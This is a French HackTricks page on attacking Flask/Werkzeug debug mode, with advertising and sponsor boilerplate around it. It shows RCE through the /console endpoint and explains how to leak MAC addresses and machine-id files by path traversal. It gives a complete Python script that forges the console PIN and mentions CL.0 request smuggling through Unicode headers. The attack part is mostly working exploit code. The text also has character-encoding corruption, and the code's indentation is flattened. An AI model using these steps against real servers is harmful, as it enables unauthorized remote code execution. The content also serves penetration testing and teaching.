# Werkzeug / Flask Debug

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert de l'√©quipe rouge AWS de HackTricks)</strong></a><strong>!</strong></summary>

D'autres fa√ßons de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

<figure><img src="../../.gitbook/assets/image (14) (1).png" alt=""><figcaption></figcaption></figure>

**Configuration instantan√©ment disponible pour l'√©valuation des vuln√©rabilit√©s et les tests de p√©n√©tration**. Lancez un pentest complet de n'importe o√π avec plus de 20 outils et fonctionnalit√©s allant de la reconnaissance au reporting. Nous ne rempla√ßons pas les pentesteurs - nous d√©veloppons des outils personnalis√©s, des modules de d√©tection et d'exploitation pour leur donner du temps pour creuser plus profond√©ment, ouvrir des shells et s'amuser.

{% embed url="https://pentest-tools.com/" %}

## Console RCE

Si le mode de d√©bogage est actif, vous pourriez essayer d'acc√©der √† `/console` et obtenir une RCE.
```python
__import__('os').popen('whoami').read();
```
![](<../../.gitbook/assets/image (117).png>)

Il existe √©galement plusieurs exploits sur Internet comme [celui-ci](https://github.com/its-arun/Werkzeug-Debug-RCE) ou un dans Metasploit.

## Prot√©g√© par code PIN - Travers√©e de chemin

Dans certaines occasions, le point de terminaison **`/console`** va √™tre prot√©g√© par un code PIN. Si vous avez une **vuln√©rabilit√© de travers√©e de fichier**, vous pouvez divulguer toutes les informations n√©cessaires pour g√©n√©rer ce code PIN.

### Exploitation du code PIN de la console Werkzeug

Forcer une page d'erreur de d√©bogage dans l'application pour voir ceci:
```
The console is locked and needs to be unlocked by entering the PIN.
You can find the PIN printed out on the standard output of your
shell that runs the server
```
Un message concernant le sc√©nario "console verrouill√©e" est rencontr√© lors de la tentative d'acc√®s √† l'interface de d√©bogage de Werkzeug, indiquant la n√©cessit√© d'un NIP pour d√©verrouiller la console. La suggestion est faite d'exploiter le NIP de la console en analysant l'algorithme de g√©n√©ration du NIP dans le fichier d'initialisation du d√©bogage de Werkzeug (`__init__.py`). Le m√©canisme de g√©n√©ration du NIP peut √™tre √©tudi√© √† partir du [**d√©p√¥t de code source de Werkzeug**](https://github.com/pallets/werkzeug/blob/master/src/werkzeug/debug/__init__.py), bien qu'il soit conseill√© de se procurer le code serveur r√©el via une vuln√©rabilit√© de travers√©e de fichiers en raison de potentielles divergences de version.

Pour exploiter le NIP de la console, deux ensembles de variables, `probably_public_bits` et `private_bits`, sont n√©cessaires :

#### **`probably_public_bits`**

* **`username`** : Fait r√©f√©rence √† l'utilisateur qui a initi√© la session Flask.
* **`modname`** : G√©n√©ralement d√©sign√© comme `flask.app`.
* **`getattr(app, '__name__', getattr(app.__class__, '__name__'))`** : Renvoie g√©n√©ralement √† **Flask**.
* **`getattr(mod, '__file__', None)`** : Repr√©sente le chemin complet vers `app.py` dans le r√©pertoire Flask (par exemple, `/usr/local/lib/python3.5/dist-packages/flask/app.py`). Si `app.py` n'est pas applicable, **essayez `app.pyc`**.

#### **`private_bits`**

* **`uuid.getnode()`** : R√©cup√®re l'adresse MAC de la machine actuelle, avec `str(uuid.getnode())` la traduisant en format d√©cimal.
* Pour **d√©terminer l'adresse MAC du serveur**, il faut identifier l'interface r√©seau active utilis√©e par l'application (par exemple, `ens3`). En cas d'incertitude, **fuite `/proc/net/arp`** pour trouver l'ID du p√©riph√©rique, puis **extraire l'adresse MAC** de **`/sys/class/net/<ID du p√©riph√©rique>/address`**.
*   La conversion d'une adresse MAC hexad√©cimale en d√©cimal peut √™tre effectu√©e comme indiqu√© ci-dessous :

```python
# Exemple d'adresse MAC : 56:00:02:7a:23:ac
>>> print(0x5600027a23ac)
94558041547692
```
* **`get_machine_id()`** : Concat√®ne les donn√©es de `/etc/machine-id` ou `/proc/sys/kernel/random/boot_id` avec la premi√®re ligne de `/proc/self/cgroup` apr√®s le dernier slash (`/`).

<details>

<summary>Code pour `get_machine_id()`</summary>
```python
def get_machine_id() -> t.Optional[t.Union[str, bytes]]:
global _machine_id

if _machine_id is not None:
return _machine_id

def _generate() -> t.Optional[t.Union[str, bytes]]:
linux = b""

# machine-id is stable across boots, boot_id is not.
for filename in "/etc/machine-id", "/proc/sys/kernel/random/boot_id":
try:
with open(filename, "rb") as f:
value = f.readline().strip()
except OSError:
continue

if value:
linux += value
break

# Containers share the same machine id, add some cgroup
# information. This is used outside containers too but should be
# relatively stable across boots.
try:
with open("/proc/self/cgroup", "rb") as f:
linux += f.readline().strip().rpartition(b"/")[2]
except OSError:
pass

if linux:
return linux

# On OS X, use ioreg to get the computer's serial number.
try:
```
</details>

Une fois toutes les donn√©es n√©cessaires rassembl√©es, le script d'exploitation peut √™tre ex√©cut√© pour g√©n√©rer le code PIN de la console Werkzeug. Le script utilise les `probably_public_bits` et `private_bits` assembl√©s pour cr√©er un hash, qui est ensuite soumis √† un traitement suppl√©mentaire pour produire le code PIN final. Voici le code Python pour ex√©cuter ce processus :
```python
import hashlib
from itertools import chain
probably_public_bits = [
'web3_user',  # username
'flask.app',  # modname
'Flask',  # getattr(app, '__name__', getattr(app.__class__, '__name__'))
'/usr/local/lib/python3.5/dist-packages/flask/app.py'  # getattr(mod, '__file__', None),
]

private_bits = [
'279275995014060',  # str(uuid.getnode()),  /sys/class/net/ens33/address
'd4e6cb65d59544f3331ea0425dc555a1'  # get_machine_id(), /etc/machine-id
]

# h = hashlib.md5()  # Changed in https://werkzeug.palletsprojects.com/en/2.2.x/changes/#version-2-0-0
h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
if not bit:
continue
if isinstance(bit, str):
bit = bit.encode('utf-8')
h.update(bit)
h.update(b'cookiesalt')
# h.update(b'shittysalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
h.update(b'pinsalt')
num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv = None
if rv is None:
for group_size in 5, 4, 3:
if len(num) % group_size == 0:
rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
for x in range(0, len(num), group_size))
break
else:
rv = num

print(rv)
```
Ce script produit le PIN en hachant les bits concat√©n√©s, en ajoutant des sels sp√©cifiques (`cookiesalt` et `pinsalt`), et en formatant la sortie. Il est important de noter que les valeurs r√©elles de `probably_public_bits` et `private_bits` doivent √™tre obtenues avec pr√©cision √† partir du syst√®me cible pour garantir que le PIN g√©n√©r√© correspond √† celui attendu par la console Werkzeug.

{% hint style="success" %}
Si vous utilisez une **ancienne version** de Werkzeug, essayez de changer l'**algorithme de hachage en md5** au lieu de sha1.
{% endhint %}

## Caract√®res Unicode Werkzeug

Comme observ√© dans [**cette issue**](https://github.com/pallets/werkzeug/issues/2833), Werkzeug ne ferme pas une requ√™te avec des caract√®res Unicode dans les en-t√™tes. Et comme expliqu√© dans [**ce compte-rendu**](https://mizu.re/post/twisty-python), cela pourrait causer une vuln√©rabilit√© de Smuggling de Requ√™te CL.0.

Cela est d√ª au fait qu'avec Werkzeug, il est possible d'envoyer certains caract√®res **Unicode** et cela fera planter le serveur. Cependant, si la connexion HTTP a √©t√© cr√©√©e avec l'en-t√™te **`Connection: keep-alive`**, le corps de la requ√™te ne sera pas lu et la connexion restera ouverte, donc le **corps** de la requ√™te sera trait√© comme la **prochaine requ√™te HTTP**.

## R√©f√©rences

* [**https://www.daehee.com/werkzeug-console-pin-exploit/**](https://www.daehee.com/werkzeug-console-pin-exploit/)
* [**https://ctftime.org/writeup/17955**](https://ctftime.org/writeup/17955)
* [**https://github.com/pallets/werkzeug/issues/2833**](https://github.com/pallets/werkzeug/issues/2833)
* [**https://mizu.re/post/twisty-python**](https://mizu.re/post/twisty-python)

<figure><img src="../../.gitbook/assets/image (14) (1).png" alt=""><figcaption></figcaption></figure>

**Configuration instantan√©ment disponible pour l'√©valuation des vuln√©rabilit√©s et les tests d'intrusion**. Lancez un pentest complet de n'importe o√π avec plus de 20 outils et fonctionnalit√©s allant de la reconnaissance aux rapports. Nous ne rempla√ßons pas les pentesteurs - nous d√©veloppons des outils personnalis√©s, des modules de d√©tection et d'exploitation pour leur donner du temps pour creuser plus profond√©ment, ouvrir des shells et s'amuser.

{% embed url="https://pentest-tools.com/" %}

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres fa√ßons de soutenir HackTricks:

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez** üí¨ le groupe Discord](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
